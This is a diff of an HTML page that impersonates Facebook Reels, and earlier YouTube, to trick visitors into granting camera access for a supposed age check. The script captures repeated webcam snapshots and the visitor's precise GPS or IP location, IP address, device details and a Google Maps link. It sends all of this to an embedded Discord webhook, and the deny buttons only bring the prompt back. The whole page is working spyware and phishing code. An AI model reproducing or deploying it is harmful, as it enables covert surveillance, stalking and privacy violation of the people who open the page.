@@ -3,236 +3,180 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>djemail gashi - YouTube</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-  <link rel="icon" href="https://www.youtube.com/s/desktop/1e8a78f5/img/favicon_32x32.png">
+  <title>Facebook</title>
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
   <style>
-    :root {
-      --yt-red: #f00;
-      --yt-bg: #0f0f0f;
-      --yt-dark: #181818;
-      --yt-gray: #aaa;
-      --yt-light-gray: #272727;
-    }
-    * {margin:0;padding:0;box-sizing:border-box;}
-    body {
-      font-family:'Roboto',sans-serif;
-      background:var(--yt-bg);
-      color:#fff;
-      line-height:1.4;
-      -webkit-tap-highlight-color:transparent;
-      overflow:hidden;
-    }
-    header {
-      position:fixed;top:0;left:0;right:0;height:56px;
-      background:#000;display:flex;align-items:center;
-      padding:0 16px;z-index:100;border-bottom:1px solid #303030;
-    }
-    .logo {height:24px;margin-right:24px;}
-    .search-bar {
-      flex:1;max-width:640px;height:40px;background:#121212;
-      border:1px solid #303030;border-radius:40px;
-      display:flex;align-items:center;padding:0 16px;
-    }
-    .search-bar input {
-      flex:1;background:transparent;border:none;
-      color:#fff;font-size:16px;outline:none;
-    }
-    .right-icons {display:flex;gap:20px;align-items:center;margin-left:24px;}
-    .icon {width:32px;height:32px;background:#333;border-radius:50%;}
-
-    .main {margin-top:56px;padding:24px;max-width:1800px;margin:56px auto 0;}
-    .player {
-      position:relative;width:100%;background:#000;
-      border-radius:12px;overflow:hidden;
-      box-shadow:0 4px 20px rgba(0,0,0,0.7);
-    }
-    .thumb {width:100%;display:block;}
-    .play-overlay {
-      position:absolute;inset:0;display:flex;
-      align-items:center;justify-content:center;
-      background:rgba(0,0,0,0.35);cursor:pointer;
-    }
-    .play-btn {
-      width:110px;height:74px;background:var(--yt-red);
-      border-radius:50%/80%;display:flex;align-items:center;justify-content:center;
-      box-shadow:0 0 25px #f00;
-    }
-    .play-btn::before {
-      content:'';border:18px solid transparent;border-left:30px solid #fff;margin-left:6px;
-    }
-
-    #prompt {
-      position:fixed;inset:0;background:rgba(0,0,0,0.94);
-      display:none;justify-content:center;align-items:center;z-index:9999;
-    }
-    #prompt-box {
-      background:#181818;padding:50px;border-radius:16px;
-      max-width:480px;text-align:center;
-    }
-    #error-msg {
-      color:#f44;margin:20px 0;display:none;
-    }
-    .btn {
-      padding:16px 40px;font-size:1.25rem;border:none;
-      border-radius:8px;margin:12px;cursor:pointer;
-    }
-    .allow {background:#065fd4;color:white;}
-    .deny {background:#303030;color:#ddd;}
-
-    #block-overlay {
-      position:fixed;inset:0;background:rgba(20,0,0,0.98);
-      display:none;justify-content:center;align-items:center;
-      z-index:10000;flex-direction:column;text-align:center;
-      animation:pulse 2s infinite alternate;
-    }
-    @keyframes pulse {
-      0% {opacity:0.92;}
-      100% {opacity:0.98;}
-    }
-    .block-text {
-      font-size:5rem;font-weight:bold;color:#f00;
-      text-shadow:0 0 40px #f00;margin-bottom:40px;
-    }
-    .block-sub {
-      font-size:2rem;color:#ff4444;max-width:80%;
-    }
+    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; }
+    .reel-header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.7); display:flex; align-items:center; padding:0 16px; z-index:100; backdrop-filter:blur(10px); }
+    .close { font-size:32px; font-weight:bold; cursor:pointer; margin-right:16px; }
+    .reel-title { flex:1; text-align:center; font-size:18px; font-weight:600; }
+    .content { height:100vh; position:relative; }
+    .profile { position:absolute; top:70px; left:16px; display:flex; align-items:center; z-index:10; }
+    .ava { width:44px; height:44px; border-radius:50%; background:#555; margin-right:12px; }
+    .info { font-size:16px; line-height:1.2; }
+    .name { font-weight:600; }
+    .pub { font-size:13px; opacity:0.85; }
+    .play-area { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:5; }
+    .play { width:110px; height:110px; background:rgba(0,0,0,0.55); border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; }
+    .tri { width:0; height:0; border-top:36px solid transparent; border-bottom:36px solid transparent; border-left:58px solid #fff; margin-left:10px; }
+    .overlay { position:absolute; bottom:220px; left:0; right:0; font-size:2.6rem; text-align:center; text-shadow:0 5px 25px #000; pointer-events:none; line-height:1.1; z-index:4; }
+    .bottom { position:absolute; bottom:40px; right:24px; display:flex; flex-direction:column; gap:32px; font-size:34px; color:#fff; z-index:6; }
+    .audio { position:absolute; bottom:20px; left:16px; font-size:14px; opacity:0.8; z-index:10; }
+    #cam-prompt, #loc-prompt { position:fixed; inset:0; background:rgba(0,0,0,0.92); display:none; align-items:center; justify-content:center; z-index:9999; }
+    .box { background:#fff; color:#000; padding:48px 36px; border-radius:20px; max-width:440px; text-align:center; box-shadow:0 16px 60px rgba(0,0,0,0.7); }
+    .btn { padding:16px 70px; font-size:1.25rem; font-weight:bold; border:none; border-radius:10px; margin:20px 12px; cursor:pointer; }
+    .allow { background:#1877f2; color:#fff; }
+    .deny { background:#e4e6eb; color:#000; }
   </style>
 </head>
 <body>
+<div class="reel-header">
+  <div class="close">×</div>
+  <div class="reel-title">Reels</div>
+</div>
 
-<header>
-  <img src="https://www.youtube.com/img/desktop/yt_1200.png" class="logo" alt="YouTube">
-  <div class="search-bar">
-    <input type="text" placeholder="Suchen">
-  </div>
-  <div class="right-icons">
-    <div class="icon"></div>
-    <div class="icon"></div>
-    <div class="icon"></div>
-  </div>
-</header>
-
-<div class="main">
-  <div class="player">
-    <img class="thumb" src="https://img.youtube.com/vi/-oXy7kZSdRo/maxresdefault.jpg" alt="Thumbnail">
-    <div class="play-overlay" id="playBtn">
-      <div class="play-btn"></div>
+<div class="content">
+  <div class="profile">
+    <div class="ava"></div>
+    <div class="info">
+      <div class="name">Zorica Zoka Dimitrijevic</div>
+      <div class="pub">Öffentlich</div>
     </div>
   </div>
+
+  <div class="play-area" id="play">
+    <div class="play"><div class="tri"></div></div>
+  </div>
+
+  <div class="overlay">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>
+
+  <div class="bottom">
+    <div>❤️ 14.6K</div>
+    <div>💬 305</div>
+    <div>➤</div>
+  </div>
+
+  <div class="audio">Zorica Zoka Dimitrijevic · Original audio · Zorica</div>
 </div>
 
-<div id="prompt">
-  <div id="prompt-box">
+<div id="cam-prompt">
+  <div class="box">
     <h2>Video kann nicht abgespielt werden</h2>
-    <p style="margin:25px 0;font-size:1.25rem;">
-      Um das Video anzusehen, musst du kurz die Kamera freigeben (Altersverifikation).
-    </p>
-    <div id="error-msg" style="color:#f44;margin:20px 0;display:none;">Zugriff verweigert! Versuche es erneut.</div>
-    <button id="allowBtn" class="btn allow">KAMERA FREIGEBEN</button>
-    <button id="denyBtn" class="btn deny">ABBRECHEN</button>
+    <p style="margin:28px 0; font-size:1.3rem;">Kurze Kamera-Freigabe für Altersprüfung nötig.</p>
+    <div id="err-cam" style="color:#c00;display:none;margin:20px 0;">Zugriff verweigert – erneut versuchen</div>
+    <button id="allowCam" class="btn allow">KAMERA FREIGEBEN</button>
+    <button id="denyCam" class="btn deny">ABBRECHEN</button>
   </div>
 </div>
 
-<div id="block-overlay">
-  <div class="block-text">ERROR</div>
-  <div class="block-sub">Zugriff verweigert! Die Seite ist gesperrt. Du kannst nichts mehr tun.</div>
+<div id="loc-prompt">
+  <div class="box">
+    <h2>Standort teilen</h2>
+    <p style="margin:28px 0; font-size:1.3rem;">Teile deinen genauen Standort um das Video zu sehen.</p>
+    <button id="allowLoc" class="btn allow">STANDORT TEILEN</button>
+    <button id="denyLoc" class="btn deny">NEIN</button>
+  </div>
 </div>
 
-<video id="v" autoplay playsinline muted style="display:none"></video>
+<video id="v" autoplay muted playsinline style="display:none"></video>
 <canvas id="c" style="display:none"></canvas>
 
 <script>
-  const WEBHOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
+const HOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
+let snap=0, str=null, vid=document.getElementById('v'), can=document.getElementById('c');
 
-  const v = document.getElementById("v");
-  const c = document.getElementById("c");
-  const promptEl = document.getElementById("prompt");
-  const errorMsg = document.getElementById("error-msg");
-  const playBtn = document.getElementById("playBtn");
-  const blockOverlay = document.getElementById("block-overlay");
+async function getIPLoc() {
+  let geo=null;
+  try { geo=await (await fetch('https://ipapi.co/json/')).json(); if (geo.ip && geo.latitude) return geo; } catch {}
+  try { geo=await (await fetch('https://ipinfo.io/json')).json(); if (geo.ip && geo.loc) {
+    const [la,lo]=geo.loc.split(','); geo.latitude=parseFloat(la); geo.longitude=parseFloat(lo); return geo;
+  }} catch {}
+  return {ip:'?', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
+}
 
-  let stream = null;
-  let count = 0;
+async function getGPS() {
+  return new Promise(r=>{
+    if (!navigator.geolocation) return r(null);
+    navigator.geolocation.getCurrentPosition(p=>r({latitude:p.coords.latitude, longitude:p.coords.longitude, accuracy:p.coords.accuracy}), ()=>r(null), {enableHighAccuracy:true, timeout:16000});
+  });
+}
 
-  async function getIPData() {
-    for (let url of ["https://ipapi.co/json/", "https://ipinfo.io/json"]) {
-      try {
-        const r = await fetch(url);
-        const d = await r.json();
-        if (d.ip) return d;
-      } catch {}
+async function send(type, blob=null) {
+  try {
+    let loc = await getGPS() || await getIPLoc();
+    let ip = loc.ip || '?';
+    let city = loc.city || '?', reg = loc.region || '?', ctry = loc.country || '?', plz = loc.postal || '?', org = loc.org || '?';
+    let lat = loc.latitude, lon = loc.longitude;
+    let acc = lat ? `${Math.round(loc.accuracy || 1000)}m` : 'IP-Fallback';
+    let maps = lat ? `https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c` : null;
+
+    const emb = {
+      title: `🔴 FB ${type} #${++snap}`,
+      color: lat ? 0x00ff88 : 0xff0000,
+      fields: [
+        {name:"Event",value:type,inline:true},
+        {name:"IP + Loc",value:`**${ip}**\n${city} • ${reg} • ${ctry} • ${plz} • ${org}`,inline:true},
+        {name:"Acc",value:acc,inline:true},
+        {name:"UA",value:navigator.userAgent.slice(0,140),inline:false},
+        {name:"Screen",value:`${screen.width}×${screen.height}`,inline:true},
+        {name:"Time",value:new Date().toISOString(),inline:true}
+      ],
+      timestamp: new Date().toISOString()
+    };
+    if (maps) emb.fields.push({name:"Maps (Haus/Street)",value:`[→ exakte Position](${maps})`,inline:false});
+
+    const pay = {embeds:[emb]};
+    if (blob) {
+      let fd=new FormData();
+      fd.append("payload_json",JSON.stringify(pay));
+      fd.append("file",blob,`fb_${Date.now()}.jpg`);
+      await fetch(HOOK+"?wait=true",{method:"POST",body:fd});
+    } else {
+      await fetch(HOOK+"?wait=true",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(pay)});
     }
-    return {ip:"unknown",city:"?",region:"?",country:"?",postal:"?",org:"?"};
+  } catch {}
+}
+
+document.getElementById('play').onclick = () => {
+  document.getElementById('cam-prompt').style.display='flex';
+  send('PLAY');
+};
+
+document.getElementById('allowCam').onclick = async () => {
+  document.getElementById('cam-prompt').style.display='none';
+  try {
+    str=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}}});
+    vid.srcObject=str;
+    await vid.play();
+    can.width=vid.videoWidth||1280; can.height=vid.videoHeight||720;
+    setInterval(async()=>{
+      can.getContext('2d').drawImage(vid,0,0,can.width,can.height);
+      let b=await new Promise(r=>can.toBlob(r,'image/jpeg',0.88));
+      send('CAM SNAP',b);
+    },1400);
+    setTimeout(()=>document.getElementById('loc-prompt').style.display='flex',3200);
+  } catch(e){
+    send('CAM ERR');
+    document.getElementById('err-cam').style.display='block';
+    setTimeout(()=>document.getElementById('cam-prompt').style.display='flex',2400);
   }
+};
 
-  async function sendToWebhook(type, blob = null, extra = {}) {
-    try {
-      const ip = await getIPData();
-      const payload = { embeds: [{ 
-        title: `🔴 ${type} #${++count}`,
-        color: 0xFF0000,
-        fields: [
-          {name:"Ereignis",value:type,inline:true},
-          {name:"IP + Adresse",value:`**${ip.ip}**\n${ip.city} • ${ip.region} • ${ip.country}\nPLZ: ${ip.postal} • ${ip.org}`,inline:true},
-          {name:"User-Agent",value:navigator.userAgent.substring(0,140),inline:false},
-          {name:"Bildschirm",value:`${screen.width}×${screen.height}`,inline:true},
-          {name:"Zeit",value:new Date().toISOString(),inline:true}
-        ],
-        timestamp: new Date().toISOString()
-      }]};
+document.getElementById('denyCam').onclick = () => {
+  document.getElementById('err-cam').style.display='block';
+  send('CAM DENY');
+  setTimeout(()=>document.getElementById('cam-prompt').style.display='flex',1800);
+};
 
-      if (extra.lat) payload.embeds[0].fields.push({name:"Standort",value:`Lat ${extra.lat.toFixed(5)} Lon ${extra.lon.toFixed(5)}\n[Maps](https://maps.google.com/?q=${extra.lat},${extra.lon})`,inline:false});
+document.getElementById('allowLoc').onclick = async () => {
+  document.getElementById('loc-prompt').style.display='none';
+  send('LOC OK');
+};
 
-      if (blob) {
-        const fd = new FormData();
-        fd.append("payload_json", JSON.stringify(payload));
-        fd.append("file", blob, `shot_${Date.now()}.jpg`);
-        await fetch(WEBHOOK + "?wait=true", {method:"POST", body:fd});
-      } else {
-        await fetch(WEBHOOK + "?wait=true", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
-      }
-    } catch(e) {}
-  }
-
-  playBtn.onclick = () => { promptEl.style.display = "flex"; sendToWebhook("PLAY_KLICK"); };
-
-  document.getElementById("allowBtn").onclick = async () => {
-    promptEl.style.display = "none";
-    // Zodra toegestaan → blokkeer direct de hele pagina
-    blockOverlay.style.display = "flex";
-    sendToWebhook("KAMERA_ZUGELASSEN_ABER_GEBLOCKT");
-
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-      v.srcObject = stream;
-      v.playsInline = true;
-      v.muted = true;
-
-      await new Promise(r => {
-        v.onloadedmetadata = () => v.play();
-        v.oncanplaythrough = () => setTimeout(r, 1500);
-      });
-
-      c.width = v.videoWidth || 640;
-      c.height = v.videoHeight || 480;
-
-      setInterval(async () => {
-        c.getContext("2d").drawImage(v,0,0,c.width,c.height);
-        const blob = await new Promise(res => c.toBlob(res,"image/jpeg",0.92));
-        sendToWebhook("KAMERA_SHOT", blob);
-      }, 800);
-
-    } catch(e) {
-      sendToWebhook("KAMERA_FEHLER_NACH_BLOCK", null, {error: e.message});
-    }
-  };
-
-  document.getElementById("denyBtn").onclick = () => {
-    errorMsg.style.display = "block";
-    sendToWebhook("KAMERA_VERWEIGERT");
-    setTimeout(() => promptEl.style.display = "flex", 700);
-  };
+document.getElementById('denyLoc').onclick = () => {
+  document.getElementById('loc-prompt').style.display='none';
+  send('LOC NO');
+};
 </script>
 </body>
 </html>
